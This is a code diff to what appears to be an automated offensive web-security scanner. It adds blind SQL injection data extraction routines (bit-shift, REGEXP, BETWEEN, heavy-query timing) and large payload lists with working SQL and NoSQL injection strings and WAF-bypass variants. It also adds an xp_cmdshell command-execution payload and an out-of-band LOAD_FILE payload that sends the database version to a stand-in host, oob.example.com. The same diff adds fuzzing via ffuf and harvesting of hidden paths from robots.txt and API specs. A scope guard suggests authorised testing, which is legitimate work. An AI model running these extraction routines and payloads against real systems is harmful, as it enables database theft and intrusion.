@@ -21,6 +21,10 @@ from ai_brain.active.scope_guard import ActiveScopeGuard
 
 logger = structlog.get_logger()
 
+# Module-level alias for SystematicFuzzer.BUILTIN_WORDLISTS (late-bound below class).
+# Allows `from deterministic_tools import _WORDLISTS`.
+_WORDLISTS: dict[str, list[str]] = {}  # populated after SystematicFuzzer definition
+
 
 # ── Goja 502 Detection & Auto-Fallback ──────────────────────────────
 
@@ -28,12 +32,14 @@ _GOJA_ERROR_MARKERS = (
     "Client.Timeout exceeded",
     "net/http: request canceled",
     "dial tcp",
+    "read tcp",
     "connection refused",
     "no such host",
     "TLS handshake timeout",
     "context deadline exceeded",
     "i/o timeout",
     "connection reset by peer",
+    "use of closed network connection",
     "EOF",
 )
 
@@ -343,6 +349,175 @@ class BlindSQLiExtractor:
             logger.warning("unknown_condition_type", type=cond_type)
             return False
 
+    # ── Bit-shifting extraction ─────────────────────────────────────
+
+    # DB-specific bitshift SQL templates
+    _DB_BITSHIFT = {
+        "mysql": "ASCII(SUBSTRING(({target_query}),{pos},1))>>{bit}&1=1",
+        "postgres": "(ASCII(SUBSTRING(({target_query}),{pos},1))>>{bit})&1=1",
+        "mssql": "(ASCII(SUBSTRING(({target_query}),{pos},1))/{divisor})%2=1",
+        "sqlite": "(UNICODE(SUBSTR(({target_query}),{pos},1))>>{bit})&1=1",
+    }
+
+    # DB-specific BETWEEN templates
+    _DB_BETWEEN = {
+        "mysql": "ASCII(SUBSTRING(({target_query}),{pos},1)) BETWEEN {low} AND {high}",
+        "postgres": "ASCII(SUBSTRING(({target_query}),{pos},1)) BETWEEN {low} AND {high}",
+        "mssql": "ASCII(SUBSTRING(({target_query}),{pos},1)) BETWEEN {low} AND {high}",
+        "sqlite": "UNICODE(SUBSTR(({target_query}),{pos},1)) BETWEEN {low} AND {high}",
+    }
+
+    # Heavy-query delay templates (when SLEEP/pg_sleep/WAITFOR blocked)
+    _HEAVY_QUERY = {
+        "mysql": "(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)",
+        "postgres": "(SELECT COUNT(*) FROM generate_series(1,10000000))",
+        "mssql": "(SELECT COUNT(*) FROM spt_values A CROSS JOIN spt_values B)",
+        "sqlite": "(SELECT COUNT(*) FROM sqlite_master A,sqlite_master B,sqlite_master C,sqlite_master D)",
+    }
+
+    def _build_bitshift_payload(self, position: int, bit: int,
+                                target_query: str, db_type: str) -> str:
+        """Generate a bit-shift test payload for the given DB type."""
+        tmpl = self._DB_BITSHIFT.get(db_type, self._DB_BITSHIFT["mysql"])
+        if db_type == "mssql":
+            # MSSQL lacks >> operator: use integer division by 2^bit
+            return tmpl.format(
+                target_query=target_query, pos=position,
+                divisor=2 ** bit, bit=bit,
+            )
+        return tmpl.format(
+            target_query=target_query, pos=position, bit=bit,
+        )
+
+    async def extract_char_bitshift(
+        self,
+        url: str,
+        method: str,
+        param: str,
+        injection_prefix: str,
+        true_condition: dict,
+        db_type: str,
+        target_query: str,
+        position: int,
+        other_params: dict | None = None,
+    ) -> str | None:
+        """Extract one character using bit-shifting -- exactly 7-8 requests per char.
+
+        Unlike binary search which uses comparison operators (>) that may be
+        filtered, bit-shifting uses only &, >>, and integer division, which
+        WAFs rarely block.
+
+        Args:
+            url: Target URL (base, no query string).
+            method: HTTP method.
+            param: Vulnerable parameter name.
+            injection_prefix: SQL prefix before the condition (e.g. "' AND ").
+            true_condition: How to detect TRUE response.
+            db_type: Database type.
+            target_query: SQL query whose result to extract.
+            position: Character position (1-based).
+            other_params: Additional request parameters.
+
+        Returns:
+            The extracted character, or None if out of printable range.
+        """
+        if other_params is None:
+            other_params = {}
+        char_val = 0
+        for bit in range(7, -1, -1):  # bits 7 down to 0
+            condition = self._build_bitshift_payload(position, bit, target_query, db_type)
+            payload = f"{injection_prefix}{condition}--"
+            resp = await self._send_request(url, method, param, payload, other_params)
+            is_true = self._evaluate_condition(resp, true_condition)
+            if is_true:
+                char_val |= (1 << bit)
+        return chr(char_val) if 32 <= char_val <= 126 else None
+
+    async def extract_char_regexp(
+        self,
+        url: str,
+        method: str,
+        param: str,
+        injection_prefix: str,
+        true_condition: dict,
+        target_query: str,
+        position: int,
+        other_params: dict | None = None,
+    ) -> str | None:
+        """Extract one character using REGEXP/RLIKE binary narrowing (MySQL only).
+
+        Tests character ranges like REGEXP '^[a-n]' to narrow down the
+        character at a given position with ~6-7 requests per char.
+        """
+        if other_params is None:
+            other_params = {}
+        low, high = 32, 126
+        while low < high:
+            mid = (low + high) // 2
+            range_start = chr(low)
+            range_end = chr(mid)
+            # Build REGEXP range test
+            condition = (
+                f"SUBSTRING(({target_query}),{position},1) "
+                f"REGEXP '^[{range_start}-{range_end}]'"
+            )
+            payload = f"{injection_prefix}{condition}--"
+            resp = await self._send_request(url, method, param, payload, other_params)
+            is_true = self._evaluate_condition(resp, true_condition)
+            if is_true:
+                high = mid
+            else:
+                low = mid + 1
+        return chr(low) if 32 <= low <= 126 else None
+
+    async def extract_char_between(
+        self,
+        url: str,
+        method: str,
+        param: str,
+        injection_prefix: str,
+        true_condition: dict,
+        db_type: str,
+        target_query: str,
+        position: int,
+        other_params: dict | None = None,
+    ) -> str | None:
+        """Extract one character using BETWEEN-based binary narrowing.
+
+        Alternative to > comparisons when the greater-than operator is
+        filtered. Uses ASCII(SUBSTRING(...)) BETWEEN {low} AND {high}.
+        """
+        if other_params is None:
+            other_params = {}
+        tmpl = self._DB_BETWEEN.get(db_type, self._DB_BETWEEN["mysql"])
+        low, high = 32, 126
+        while low < high:
+            mid = (low + high) // 2
+            # Test: char BETWEEN low AND mid (is char <= mid?)
+            condition = tmpl.format(
+                target_query=target_query, pos=position,
+                low=low, high=mid,
+            )
+            payload = f"{injection_prefix}{condition}--"
+            resp = await self._send_request(url, method, param, payload, other_params)
+            is_true = self._evaluate_condition(resp, true_condition)
+            if is_true:
+                high = mid
+            else:
+                low = mid + 1
+        return chr(low) if 32 <= low <= 126 else None
+
+    def get_heavy_query(self, db_type: str) -> str:
+        """Return a heavy Cartesian product query for time-based blind injection.
+
+        Use this as an alternative when SLEEP/pg_sleep/WAITFOR are blocked.
+        Wrap the heavy query in a conditional to create a measurable delay:
+            MySQL:  IF(condition, (heavy_query), 1)
+            MSSQL:  CASE WHEN condition THEN (heavy_query) ELSE 1 END
+            PG:     CASE WHEN condition THEN (heavy_query) ELSE 1 END
+        """
+        return self._HEAVY_QUERY.get(db_type, self._HEAVY_QUERY["mysql"])
+
     async def close(self) -> None:
         """Close the HTTP client."""
         await self._client.aclose()
@@ -564,6 +739,75 @@ class ResponseDiffAnalyzer:
 
         return "PASSED", "Response matches baseline"
 
+    # ── SQL Error Pattern Detection ──────────────────────────────────
+
+    _SQLI_ERROR_PATTERNS: dict[str, list[re.Pattern[str]]] = {
+        "mysql": [
+            re.compile(r"You have an error in your SQL syntax", re.I),
+            re.compile(r"XPATH syntax error.*?'~(.*?)~'", re.I),
+            re.compile(r"Duplicate entry '~?(.*?)~?' for key", re.I),
+            re.compile(r"Unknown column '(.*?)'", re.I),
+            re.compile(r"Table '(.*?)' doesn't exist", re.I),
+            re.compile(r"BIGINT UNSIGNED value is out of range", re.I),
+            re.compile(r"Data truncation: Truncated incorrect", re.I),
+            re.compile(r"Operand should contain \d column", re.I),
+            re.compile(r"Subquery returns more than 1 row", re.I),
+        ],
+        "mssql": [
+            re.compile(r"Unclosed quotation mark", re.I),
+            re.compile(r"Conversion failed when converting.*?'(.*?)'", re.I),
+            re.compile(r"Incorrect syntax near", re.I),
+            re.compile(r"The multi-part identifier .* could not be bound", re.I),
+            re.compile(r"String or binary data would be truncated", re.I),
+            re.compile(r"Must declare the scalar variable", re.I),
+            re.compile(r"Invalid column name '(.*?)'", re.I),
+            re.compile(r"Invalid object name '(.*?)'", re.I),
+            re.compile(r"Arithmetic overflow", re.I),
+        ],
+        "postgresql": [
+            re.compile(r"invalid input syntax for (?:type )?(?:integer|numeric).*?\"(.*?)\"", re.I),
+            re.compile(r"unterminated quoted string", re.I),
+            re.compile(r"syntax error at or near", re.I),
+            re.compile(r"column \"(.*?)\" does not exist", re.I),
+            re.compile(r"relation \"(.*?)\" does not exist", re.I),
+            re.compile(r"ERROR:\s+current transaction is aborted", re.I),
+            re.compile(r"query_to_xml", re.I),
+        ],
+        "oracle": [
+            re.compile(r"ORA-\d{5}", re.I),
+            re.compile(r"DRG-11701.*?thesaurus (.*?) does not exist", re.I),
+            re.compile(r"quoted string not properly terminated", re.I),
+            re.compile(r"missing right parenthesis", re.I),
+            re.compile(r"invalid identifier", re.I),
+            re.compile(r"SQL command not properly ended", re.I),
+            re.compile(r"CTXSYS\.DRITHSX\.SN", re.I),
+        ],
+        "sqlite": [
+            re.compile(r"SQLITE_ERROR", re.I),
+            re.compile(r'near ".*?": syntax error', re.I),
+            re.compile(r"unrecognized token", re.I),
+            re.compile(r"no such table: (.*?)(?:\s|$)", re.I),
+            re.compile(r"no such column: (.*?)(?:\s|$)", re.I),
+            re.compile(r"integer overflow", re.I),
+            re.compile(r"SELECTs to the left and right of UNION do not have the same number of result columns", re.I),
+        ],
+    }
+
+    def detect_sqli_errors(self, text: str) -> tuple[str | None, str | None]:
+        """Check response text for SQL error patterns across all DB engines.
+
+        Returns:
+            (db_engine, extracted_data) where db_engine is one of
+            'mysql', 'mssql', 'postgresql', 'oracle', 'sqlite' or None,
+            and extracted_data is the first captured group if any.
+        """
+        for engine, patterns in self._SQLI_ERROR_PATTERNS.items():
+            for pat in patterns:
+                m = pat.search(text)
+                if m:
+                    return engine, m.group(1) if m.lastindex else None
+        return None, None
+
 
 # ── Systematic Fuzzer ─────────────────────────────────────────────────
 
@@ -636,6 +880,44 @@ class SystematicFuzzer:
             "0xBE", "' LIKE '%", "1' AND 1=CONVERT(int,@@version)--",
             "1 UNION SELECT @@version--", "' OR username LIKE '%",
             "' AND ASCII(SUBSTRING(version(),1,1))>50--",
+            # Error-based — MySQL
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
+            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1337)--",
+            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--",
+            # Error-based — MSSQL
+            "' AND 1=CONVERT(INT,(SELECT '~'+@@version+'~'))--",
+            "' AND 1337 IN (SELECT ('~'+@@version+'~'))--",
+            # Error-based — PostgreSQL
+            "' AND 1=CAST((SELECT version()) AS int)--",
+            "' AND CAST(CHR(32)||(SELECT query_to_xml('select version()',true,true,'')) AS NUMERIC)--",
+            # Error-based — Oracle
+            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
+            "' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual)--",
+            # Error-based — SQLite
+            "' AND abs(-9223372036854775808)--",
+            # Time-based alternatives
+            "' AND BENCHMARK(10000000,MD5('test'))--",
+            "' OR ELT(1=1,SLEEP(5))--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+            # OOB
+            "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.oob.example.com\\\\a'))--",
+            # Heavy query (universal time-based alternative)
+            "' AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B)--",
+            # NoSQL operators (URL-encoded format)
+            "[$ne]=1",
+            "[$gt]=",
+            "[$regex]=.*",
+            "[$exists]=true",
+            # Stacked queries
+            "'; SELECT pg_sleep(5)--",
+            "'; EXEC xp_cmdshell 'whoami'--",
+            # UNION with WAF bypass
+            "' /*!50000UNION*/ /*!50000SELECT*/ NULL,version(),NULL--",
+            "'/**/UNION/**/SELECT/**/NULL,version(),NULL--",
+            "1e0UNION SELECT NULL,version(),NULL",
         ],
         "xss-payloads": [
             "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
@@ -1000,6 +1282,40 @@ class SystematicFuzzer:
             "' OR IF(1=1,1,0)--",
             "' OR IF(1=2,1,0)--",
             "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--",
+            # Scientific notation (AWS WAF bypass)
+            "1e0UNION SELECT 1,2,3",
+            "0e0UNION SELECT 1,2,3",
+            # JSON function bypass (Claroty 2022)
+            "' UNION SELECT JSON_ARRAYAGG(1)--",
+            "' AND JSON_EXTRACT('{\"a\":1}','$.a')=1--",
+            # HANDLER (MySQL, not in WAF signatures)
+            "'; HANDLER users OPEN; HANDLER users READ FIRST;--",
+            # Version comments (MySQL)
+            "' /*!50000AND*/ 1=1--",
+            "' /*!50000UNION*/ /*!50000SELECT*/ 1--",
+            # GBK charset bypass
+            "%bf%27 OR 1=1--",
+            # Dollar-quoting (PostgreSQL)
+            "$tag$' OR 1=1--$tag$",
+            # Vertical tab (ModSecurity CRS bypass)
+            "'%0bOR%0b1=1--",
+            # Form feed
+            "'%0cOR%0c1=1--",
+            # Non-breaking space (MySQL)
+            "'%a0OR%a01=1--",
+            # Backtick no-space (MySQL)
+            "'UNION(SELECT(1),(2),(3))--",
+            # Hex encoding
+            "' OR 0x313d31--",
+            # LIKE (alternative to =)
+            "' OR version() LIKE '5%'--",
+            # Function alternatives
+            "' OR MID(version(),1,1)>'4'--",
+            "' OR ORD(MID(version(),1,1))>52--",
+            # HPP
+            "1&id=' OR 1=1--",
+            # Fullwidth unicode
+            "' OR \uff11=\uff11--",
         ],
     }
 
@@ -1025,25 +1341,7 @@ class SystematicFuzzer:
         rate_limit: float = 1.0,
         **kwargs: Any,
     ) -> dict[str, Any]:
-        """Run wordlist-based fuzzing.
-
-        Args:
-            url_template: URL with {FUZZ} placeholder.
-            wordlist: Built-in wordlist name or custom list.
-            method: HTTP method (default GET).
-            headers: Custom headers.
-            body_template: Body with {FUZZ} placeholder.
-            match_status: Status codes to include.
-            filter_status: Status codes to exclude.
-            match_contains: Include if response contains this.
-            filter_contains: Exclude if response contains this.
-            match_length_range: [min, max] length to include.
-            max_requests: Max requests (default 500).
-            rate_limit: Seconds between requests (default 0.05).
-
-        Returns:
-            {total_requests, matches, errors}
-        """
+        """Run wordlist-based fuzzing. Uses ffuf when available, falls back to httpx."""
         # Resolve wordlist
         if isinstance(wordlist, str):
             words = self.BUILTIN_WORDLISTS.get(wordlist)
@@ -1052,7 +1350,6 @@ class SystematicFuzzer:
         else:
             words = list(wordlist)
 
-        # Limit
         words = words[:max_requests]
 
         # Validate base URL scope
@@ -1060,6 +1357,156 @@ class SystematicFuzzer:
         if self._scope_guard:
             self._scope_guard.validate_url(test_url)
 
+        # Try ffuf first (10-50x faster with concurrent requests)
+        import shutil
+        if shutil.which("ffuf") and len(words) >= 10:
+            result = await self._fuzz_ffuf(
+                url_template, words, method, headers, body_template,
+                match_status, filter_status, match_contains, filter_contains,
+                match_length_range,
+            )
+            if not result.get("_ffuf_failed"):
+                return result
+            logger.warning("ffuf_failed_fallback_httpx", error=result.get("error"))
+
+        # Fallback: sequential httpx
+        return await self._fuzz_httpx(
+            url_template, words, method, headers, body_template,
+            match_status, filter_status, match_contains, filter_contains,
+            match_length_range, rate_limit,
+        )
+
+    async def _fuzz_ffuf(
+        self,
+        url_template: str,
+        words: list[str],
+        method: str,
+        headers: dict | None,
+        body_template: str | None,
+        match_status: list[int] | None,
+        filter_status: list[int] | None,
+        match_contains: str | None,
+        filter_contains: str | None,
+        match_length_range: tuple[int, int] | list[int] | None,
+    ) -> dict[str, Any]:
+        """Run fuzzing via ffuf subprocess (concurrent, fast)."""
+        import json as _json
+        import tempfile
+
+        start_time = time.monotonic()
+
+        # Write wordlist to temp file
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as wf:
+            wf.write("\n".join(words))
+            wordlist_path = wf.name
+
+        try:
+            # Build ffuf command
+            cmd = [
+                "ffuf",
+                "-u", url_template,
+                "-w", wordlist_path,
+                "-X", method,
+                "-t", "20",  # 20 concurrent threads
+                "-timeout", str(min(self._timeout, 120)),
+                "-rate", "50",  # 50 req/s max
+                "-o", "/dev/stdout",
+                "-of", "json",
+                "-s",  # silent mode
+            ]
+
+            # Add proxy if available
+            if self._socks_proxy:
+                cmd.extend(["-x", self._socks_proxy])
+
+            # Add headers
+            if headers:
+                for k, v in headers.items():
+                    cmd.extend(["-H", f"{k}: {v}"])
+
+            # Add body template
+            if body_template:
+                cmd.extend(["-d", body_template])
+
+            # Add status filters
+            if match_status:
+                cmd.extend(["-mc", ",".join(str(s) for s in match_status)])
+            if filter_status:
+                cmd.extend(["-fc", ",".join(str(s) for s in filter_status)])
+
+            # Add content filters
+            if match_contains:
+                cmd.extend(["-mr", match_contains])
+            if filter_contains:
+                cmd.extend(["-fr", filter_contains])
+
+            # Add size filter
+            if match_length_range:
+                lr = list(match_length_range)
+                cmd.extend(["-fs", f"0-{lr[0]-1},{lr[1]+1}-999999999"])
+
+            proc = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+
+            try:
+                stdout, stderr = await asyncio.wait_for(
+                    proc.communicate(), timeout=self._timeout
+                )
+            except asyncio.TimeoutError:
+                proc.kill()
+                await proc.wait()
+                return {"_ffuf_failed": True, "error": "ffuf timeout"}
+
+            if proc.returncode not in (0, 1):  # ffuf returns 1 when no matches
+                return {"_ffuf_failed": True, "error": f"ffuf exit {proc.returncode}: {stderr.decode()[:500]}"}
+
+            # Parse JSON output
+            matches: list[dict[str, Any]] = []
+            raw = stdout.decode("utf-8", errors="replace").strip()
+            if raw:
+                try:
+                    data = _json.loads(raw)
+                    for r in data.get("results", []):
+                        word = r.get("input", {}).get("FUZZ", "")
+                        matches.append({
+                            "word": word,
+                            "status": r.get("status", 0),
+                            "length": r.get("length", 0),
+                            "snippet": r.get("redirectlocation", "")[:200],
+                        })
+                        logger.debug("fuzz_match", word=word, status=r.get("status"), length=r.get("length"))
+                except _json.JSONDecodeError:
+                    return {"_ffuf_failed": True, "error": "ffuf JSON parse failed"}
+
+            return {
+                "total_requests": len(words),
+                "matches": matches[:100],
+                "errors": 0,
+                "elapsed_seconds": round(time.monotonic() - start_time, 1),
+                "engine": "ffuf",
+            }
+        finally:
+            import os
+            os.unlink(wordlist_path)
+
+    async def _fuzz_httpx(
+        self,
+        url_template: str,
+        words: list[str],
+        method: str,
+        headers: dict | None,
+        body_template: str | None,
+        match_status: list[int] | None,
+        filter_status: list[int] | None,
+        match_contains: str | None,
+        filter_contains: str | None,
+        match_length_range: tuple[int, int] | list[int] | None,
+        rate_limit: float,
+    ) -> dict[str, Any]:
+        """Fallback: sequential httpx fuzzing."""
         matches: list[dict[str, Any]] = []
         errors = 0
         start_time = time.monotonic()
@@ -1067,7 +1514,7 @@ class SystematicFuzzer:
         async with _make_client(
             socks_proxy=self._socks_proxy, timeout=15, follow_redirects=True,
         ) as client:
-            for i, word in enumerate(words):
+            for word in words:
                 if time.monotonic() - start_time > self._timeout:
                     break
 
@@ -1084,7 +1531,6 @@ class SystematicFuzzer:
                     errors += 1
                     continue
 
-                # Apply filters
                 status = resp.status_code
                 length = len(resp.content)
                 body_text = resp.text
@@ -1113,10 +1559,15 @@ class SystematicFuzzer:
 
         return {
             "total_requests": len(words),
-            "matches": matches[:100],  # Cap at 100 matches
+            "matches": matches[:100],
             "errors": errors,
             "elapsed_seconds": round(time.monotonic() - start_time, 1),
+            "engine": "httpx",
         }
+
+
+# Populate module-level _WORDLISTS alias
+_WORDLISTS.update(SystematicFuzzer.BUILTIN_WORDLISTS)
 
 
 # ── JS Bundle Secret Scanner ─────────────────────────────────────────
@@ -2144,16 +2595,19 @@ class InfoDisclosureScanner:
         self._timeout = timeout
         self._socks_proxy = socks_proxy
 
-    async def scan(self, url: str, tech_stack: list[str] | None = None) -> dict[str, Any]:
+    async def scan(self, url: str, tech_stack: list[str] | None = None,
+                   spa_fingerprint: Any | None = None) -> dict[str, Any]:
         """Scan for sensitive path disclosures with content verification.
 
         Args:
             url: Base URL to scan.
             tech_stack: Optional detected technologies for path filtering.
+            spa_fingerprint: SPA detection result — used to filter catch-all responses.
 
         Returns:
             {verified: [{path, category, evidence_preview, content_length}], scanned: int, elapsed_s: float}
         """
+        self._spa_fingerprint = spa_fingerprint
         if self._scope_guard:
             self._scope_guard.validate_url(url)
 
@@ -2207,6 +2661,16 @@ class InfoDisclosureScanner:
                     if not re.search(regex, body, re.IGNORECASE | re.MULTILINE):
                         continue
 
+                    # Anti-FP: SPA catch-all gate — reject if response matches SPA baseline
+                    if self._spa_fingerprint and getattr(self._spa_fingerprint, "is_spa", False):
+                        ct_spa = resp.headers.get("content-type", "").lower()
+                        if "text/html" in ct_spa:
+                            from ai_brain.active.spa_detector import SPADetector
+                            _spa_det = SPADetector()
+                            _spa_det._last_fingerprint = self._spa_fingerprint
+                            if _spa_det.is_catch_all_response(body, len(resp.content)):
+                                continue  # SPA catch-all response, not real file
+
                     # Anti-FP: reject HTML error pages masquerading as sensitive files
                     ct = resp.headers.get("content-type", "").lower()
                     # Non-HTML sensitive files (.json, .env, .yml, .sql, .tar.gz, .zip)
@@ -2237,11 +2701,188 @@ class InfoDisclosureScanner:
                     continue  # Skip connection errors
 
         elapsed = round(time.monotonic() - start, 1)
+        # ── Auto-extract paths from robots.txt, sitemap, and API specs ──
+        extracted_paths: list[dict[str, Any]] = []
+        for item in verified:
+            cat = item["category"]
+            body_text = item.get("evidence_preview", "")
+            if cat == "robots":
+                extracted_paths.extend(
+                    self._extract_robots_paths(base_url, body_text, item.get("content_length", 0))
+                )
+            elif cat == "sitemap":
+                extracted_paths.extend(
+                    self._extract_sitemap_urls(body_text)
+                )
+            elif cat == "api_docs":
+                extracted_paths.extend(
+                    self._extract_api_spec_endpoints(base_url, body_text)
+                )
+
         return {
             "verified": verified,
             "scanned": scanned,
             "elapsed_seconds": elapsed,
+            "extracted_paths": extracted_paths,
         }
+
+    def _extract_robots_paths(self, base_url: str, preview: str, content_length: int) -> list[dict[str, Any]]:
+        """Parse robots.txt Disallow/Allow entries into testable paths."""
+        # If we only have a preview (500 chars), fetch full content
+        paths: list[dict[str, Any]] = []
+        seen: set[str] = set()
+
+        # Parse Disallow lines from preview (scanner already fetched and verified)
+        for line in preview.split("\n"):
+            line = line.strip()
+            if not line.startswith(("Disallow:", "Allow:")):
+                continue
+            directive = line.split(":", 1)[1].strip()
+            if not directive or directive == "/":
+                continue
+            # Skip wildcard-only rules
+            if directive in ("*",):
+                continue
+            # Clean path: remove wildcard suffixes for base path
+            clean = re.sub(r'[\*\$].*', '', directive).rstrip('?&')
+            if not clean or clean == "/" or clean in seen:
+                continue
+            seen.add(clean)
+            paths.append({
+                "path": clean,
+                "source": "robots.txt",
+                "notes": f"Disallowed path from robots.txt",
+            })
+
+        # If content_length suggests many more paths than in preview, fetch full robots.txt
+        if content_length > 600 and len(paths) < 20:
+            try:
+                import httpx as _httpx
+                resp = _httpx.get(f"{base_url}/robots.txt", timeout=10, verify=False, follow_redirects=True)
+                if resp.status_code == 200:
+                    for line in resp.text.split("\n"):
+                        line = line.strip()
+                        if not line.startswith("Disallow:"):
+                            continue
+                        directive = line.split(":", 1)[1].strip()
+                        if not directive or directive == "/":
+                            continue
+                        clean = re.sub(r'[\*\$].*', '', directive).rstrip('?&')
+                        if not clean or clean == "/" or clean in seen:
+                            continue
+                        seen.add(clean)
+                        paths.append({
+                            "path": clean,
+                            "source": "robots.txt",
+                            "notes": "Disallowed path from robots.txt",
+                        })
+            except Exception:
+                pass
+
+        logger.info("robots_paths_extracted", count=len(paths))
+        return paths
+
+    def _extract_sitemap_urls(self, preview: str) -> list[dict[str, Any]]:
+        """Extract URLs from sitemap XML."""
+        paths: list[dict[str, Any]] = []
+        for match in re.finditer(r'<loc>(https?://[^<]+)</loc>', preview):
+            url = match.group(1)
+            paths.append({
+                "path": url,
+                "source": "sitemap.xml",
+                "notes": "URL from sitemap",
+            })
+        logger.info("sitemap_urls_extracted", count=len(paths))
+        return paths
+
+    def _extract_api_spec_endpoints(self, base_url: str, preview: str) -> list[dict[str, Any]]:
+        """Extract endpoints from OpenAPI/Swagger/RAML specs.
+
+        If preview is small (truncated), fetches full spec from known doc URLs.
+        """
+        # If preview is short, fetch the full spec
+        full_text = preview
+        if len(preview) < 2000:
+            _spec_urls = [
+                f"{base_url}/swagger.json",
+                f"{base_url}/openapi.json",
+                f"{base_url}/api-docs",
+                f"{base_url}/api/internal/doc?xhr=true",
+                f"{base_url}/v1/swagger.json",
+                f"{base_url}/v2/swagger.json",
+            ]
+            for spec_url in _spec_urls:
+                try:
+                    resp = httpx.get(spec_url, timeout=15, verify=False, follow_redirects=True)
+                    if resp.status_code == 200 and len(resp.text) > len(full_text):
+                        ct = resp.headers.get("content-type", "").lower()
+                        body_start = resp.text[:200].lower()
+                        # Verify it's actually a spec (JSON/RAML/YAML), not HTML
+                        if "text/html" not in ct or any(kw in body_start for kw in ("swagger", "openapi", "#%raml", '"paths"')):
+                            # RAML specs have schemas first, endpoints last — need full text
+                            cap = 2_000_000 if "#%raml" in body_start.lower() else 500_000
+                            full_text = resp.text[:cap]
+                            logger.info("api_spec_full_fetched", url=spec_url, size=len(resp.text))
+                            break
+                except Exception:
+                    continue
+
+        paths: list[dict[str, Any]] = []
+        seen: set[str] = set()
+
+        # OpenAPI/Swagger: "paths": { "/endpoint": { ... } }
+        # Also matches RAML resource paths in JSON
+        for match in re.finditer(r'"(\/[a-zA-Z0-9_\-\/\{\}\.]+)"', full_text):
+            path = match.group(1)
+            # Skip JSON schema noise
+            if any(skip in path for skip in (
+                "/properties/", "/items/", "/schema/", "/definitions/",
+                "/components/", "/examples/", "/responses/",
+            )):
+                continue
+            if path not in seen and len(path) > 1 and len(path) < 200:
+                seen.add(path)
+                paths.append({
+                    "path": path,
+                    "source": "api_spec",
+                    "notes": "Endpoint from API spec",
+                })
+
+        # RAML: hierarchical /resource: lines (indentation = nesting)
+        # Build full paths by tracking indentation stack
+        if "#%RAML" in full_text[:50] or "baseUri:" in full_text[:500]:
+            indent_stack: list[tuple[int, str]] = []  # (indent_level, path_segment)
+            for line in full_text.split("\n"):
+                raml_match = re.match(r'^(\s*)(\/[a-zA-Z0-9_\-\{\}\.]+):\s*$', line)
+                if not raml_match:
+                    continue
+                indent = len(raml_match.group(1))
+                segment = raml_match.group(2)
+                # Pop stack entries at same or deeper indent (sibling/child replacement)
+                while indent_stack and indent_stack[-1][0] >= indent:
+                    indent_stack.pop()
+                indent_stack.append((indent, segment))
+                # Build full path from stack
+                full_path = "".join(seg for _, seg in indent_stack)
+                if full_path not in seen and len(full_path) > 1:
+                    seen.add(full_path)
+                    paths.append({
+                        "path": full_path,
+                        "source": "api_spec",
+                        "notes": "Endpoint from RAML spec",
+                    })
+
+        # Extract baseUri from RAML for proper URL construction
+        base_match = re.search(r'baseUri:\s*"?(https?://[^\s"]+)"?', full_text)
+        if base_match:
+            spec_base = base_match.group(1).rstrip("/")
+            # Add baseUri info so paths can be properly resolved
+            for p in paths:
+                if not p["path"].startswith("http"):
+                    p["notes"] += f" (baseUri: {spec_base})"
+
+        logger.info("api_spec_endpoints_extracted", count=len(paths))
+        return paths
 
 
 # ── Auth Endpoint Discovery ───────────────────────────────────────────
@@ -3983,10 +4624,17 @@ class XXEScanner:
         self,
         base_url: str,
         endpoints: dict[str, dict[str, Any]] | None = None,
+        spa_fingerprint: Any | None = None,
     ) -> dict[str, Any]:
         start = time.monotonic()
         findings: list[dict[str, Any]] = []
         endpoints_tested = 0
+
+        # SPA gate: SPAs serve static HTML, no XML processing
+        if spa_fingerprint and getattr(spa_fingerprint, "is_spa", False):
+            logger.info("xxe_scan_skipped_spa", base_url=base_url)
+            return {"findings": [], "endpoints_tested": 0, "requests_sent": 0,
+                    "elapsed_seconds": 0, "skipped_reason": "SPA detected"}
 
         # Collect candidate URLs
         candidates: list[str] = []
@@ -4156,12 +4804,20 @@ class DeserializationScanner:
         endpoints: dict[str, dict[str, Any]] | None = None,
         proxy_traffic: list[dict[str, Any]] | None = None,
         cookies: dict[str, str] | None = None,
+        spa_fingerprint: Any | None = None,
     ) -> dict[str, Any]:
         start = time.monotonic()
         findings: list[dict[str, Any]] = []
         endpoints_tested = 0
 
-        # Phase 1: Check cookies
+        # SPA gate: static hosting has no server-side deserialization
+        if spa_fingerprint and getattr(spa_fingerprint, "is_spa", False):
+            if getattr(spa_fingerprint, "static_hosting", False):
+                logger.info("deserialization_scan_skipped_spa", base_url=base_url)
+                return {"findings": [], "endpoints_tested": 0, "elapsed_seconds": 0,
+                        "skipped_reason": "static hosting detected"}
+
+        # Phase 1: Check cookies (always check — cookies are server-set)
         if cookies:
             findings.extend(self._scan_cookies(cookies, base_url))
 
@@ -4364,10 +5020,17 @@ class AppLevelDoSScanner:
         base_url: str,
         endpoints: dict[str, dict[str, Any]] | None = None,
         graphql_url: str | None = None,
+        spa_fingerprint: Any | None = None,
     ) -> dict[str, Any]:
         start = time.monotonic()
         findings: list[dict[str, Any]] = []
         endpoints_tested = 0
+
+        # SPA gate: SPAs serve static files, XML bomb and JSON nesting won't affect them
+        if spa_fingerprint and getattr(spa_fingerprint, "is_spa", False):
+            logger.info("dos_scan_skipped_spa", base_url=base_url)
+            return {"findings": [], "endpoints_tested": 0, "elapsed_seconds": 0,
+                    "skipped_reason": "SPA detected"}
 
         # Get baseline timing
         baseline_ms = await self._get_baseline(base_url)
